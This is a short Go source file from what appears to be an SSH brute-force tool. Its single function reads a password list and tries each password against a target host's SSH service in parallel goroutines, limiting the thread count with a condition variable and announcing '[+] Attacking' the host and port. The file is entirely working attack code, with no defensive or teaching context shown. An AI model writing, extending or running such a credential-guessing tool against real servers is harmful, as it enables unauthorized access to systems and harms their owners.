package sshclient
import (
	"fmt"
	"sync"
	"strings"
)

func (s *GoSshBrute)Bruteforce(wg *sync.WaitGroup, cd *sync.Cond)  {
	fmt.Println("[+] Attacking ",s.hostname,":",s.port)
	counter := 0 //counter
	passwords := strings.Split(string(s.passwords),"\n") //convert to string

	for _,password := range(passwords){
		cd.L.Lock()
		for counter == s.thread{ //control threads
			cd.Wait()
		}
		wg.Add(1)
		//call in separate goroutine
		go func(password string){
			defer wg.Done()
			sshConnect(s.port,s.hostname,s.username,password)
			cd.L.Lock()
			counter--  //decrement
			cd.L.Unlock()
			cd.Signal()
		}(password)
		counter++
		cd.L.Unlock()
	}
}